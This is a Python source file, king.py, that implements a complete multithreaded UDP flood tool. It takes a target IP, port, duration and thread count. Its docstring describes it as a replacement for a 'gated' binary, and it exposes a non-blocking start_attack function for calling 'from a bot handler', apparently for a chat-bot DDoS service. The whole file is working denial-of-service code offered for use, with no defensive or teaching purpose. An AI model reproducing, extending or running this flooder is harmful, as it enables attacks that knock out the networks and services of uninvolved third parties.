#!/usr/bin/env python3
"""
king.py — UDP flood engine.

Direct Python replacement for the gated ELF binary `king`.
Same signature: <IP> <PORT> <DURATION> <THREADS>
No browser gate. No subprocess. No external calls.

Exports:
    attack(target, port, duration, threads=100, payload_size=1024)  -> int
        Blocking. Returns number of worker threads that ran.
    start_attack(target, port, duration, threads=100, payload_size=1024) -> Thread
        Fire-and-forget. Returns the background thread.
"""

import socket
import sys
import threading
import time

__all__ = ["attack", "start_attack"]


def _resolve(target):
    """Return an IPv4 dotted-quad string. Raises socket.gaierror on failure."""
    try:
        socket.inet_pton(socket.AF_INET, target)
        return target
    except OSError:
        return socket.gethostbyname(target)


def _worker(sock, ip, port, end_time, payload):
    """Tight send loop until end_time. Swallows per-packet OS errors."""
    while time.time() < end_time:
        try:
            sock.sendto(payload, (ip, port))
        except OSError:
            pass


def attack(target, port, duration, threads=100, payload_size=1024):
    """
    Blocking UDP flood.

    target       : str  — IP or hostname
    port         : int  — target port
    duration     : int  — seconds
    threads      : int  — worker count (one socket per worker)
    payload_size : int  — bytes per datagram

    Returns int — number of workers actually started.
    """
    try:
        ip = _resolve(target)
    except socket.gaierror as e:
        raise ValueError(f"could not resolve {target!r}: {e}") from e

    try:
        port = int(port)
    except (TypeError, ValueError):
        raise ValueError(f"port must be an integer, got {port!r}")
    if not (0 < port < 65536):
        raise ValueError(f"port out of range: {port}")

    duration = int(duration)
    if duration <= 0:
        raise ValueError(f"duration must be > 0, got {duration}")

    threads = int(threads)
    if threads <= 0:
        raise ValueError(f"threads must be > 0, got {threads}")

    payload_size = int(payload_size)
    if payload_size <= 0:
        raise ValueError(f"payload_size must be > 0, got {payload_size}")

    end_time = time.time() + duration
    payload = b"\x00" * payload_size

    socks = []
    for _ in range(threads):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            socks.append(s)
        except OSError:
            break

    if not socks:
        raise RuntimeError("Socket creation failed")

    workers = []
    for s in socks:
        t = threading.Thread(
            target=_worker,
            args=(s, ip, port, end_time, payload),
            daemon=True,
        )
        try:
            t.start()
            workers.append(t)
        except RuntimeError:
            break

    if not workers:
        raise RuntimeError("Thread creation failed")

    for t in workers:
        t.join()

    for s in socks:
        try:
            s.close()
        except OSError:
            pass

    return len(workers)


def start_attack(target, port, duration, threads=100, payload_size=1024):
    """
    Non-blocking. Spawns attack() in a daemon thread and returns the Thread.
    Use this from a bot handler so the handler doesn't block.
    """
    t = threading.Thread(
        target=attack,
        args=(target, port, duration, threads, payload_size),
        daemon=True,
    )
    t.start()
    return t


def _main(argv):
    if len(argv) != 5:
        print(f"Usage: {argv[0]} <IP> <PORT> <DURATION> <THREADS>")
        return 1
    _, ip, port, duration, threads = argv
    try:
        n = attack(ip, int(port), int(duration), int(threads))
    except (ValueError, RuntimeError) as e:
        print(f"Error: {e}", file=sys.stderr)
        return 2
    print(f"dispatched {n} workers")
    return 0


if __name__ == "__main__":
    sys.exit(_main(sys.argv))
